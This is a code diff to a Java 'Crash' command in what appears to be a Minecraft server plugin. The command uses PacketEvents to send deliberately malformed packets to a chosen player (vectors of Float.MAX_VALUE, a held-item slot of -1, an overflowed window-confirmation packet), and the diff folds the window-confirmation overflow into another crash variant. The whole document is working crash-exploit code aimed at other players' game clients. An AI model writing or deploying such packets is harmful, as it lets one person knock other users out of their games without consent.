@@ -90,8 +90,13 @@ public final class Crash extends AbstractCommand {
                             new Vector3d(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE),
                             Float.MAX_VALUE,
                             new ArrayList<>(),
-                            new Vector3f(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE)
-                    )
+                            new Vector3f(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE))
+            );
+            PluginHookManager.getPacketEventsHook().sendPacket(player,
+                    new WrapperPlayServerWindowConfirmation(
+                            Float.MAX_EXPONENT,
+                            Short.MAX_VALUE,
+                            false) //Fixed Issue
             );
             return true;
         }
@@ -100,20 +105,7 @@ public final class Crash extends AbstractCommand {
         if (crashType.equalsIgnoreCase("changeHoldItem")) {
             PluginHookManager.getPacketEventsHook().sendPacket(player,
                     new WrapperPlayServerHeldItemChange(
-                            -1
-                    )
-            );
-            return true;
-        }
-
-        // 延迟包溢出
-        if (crashType.equalsIgnoreCase("serverWindowConfirmation")) {
-            PluginHookManager.getPacketEventsHook().sendPacket(player,
-                    new WrapperPlayServerWindowConfirmation(
-                            Float.MAX_EXPONENT,
-                            Short.MAX_VALUE,
-                            false
-                    )
+                            -1)
             );
             return true;
         }
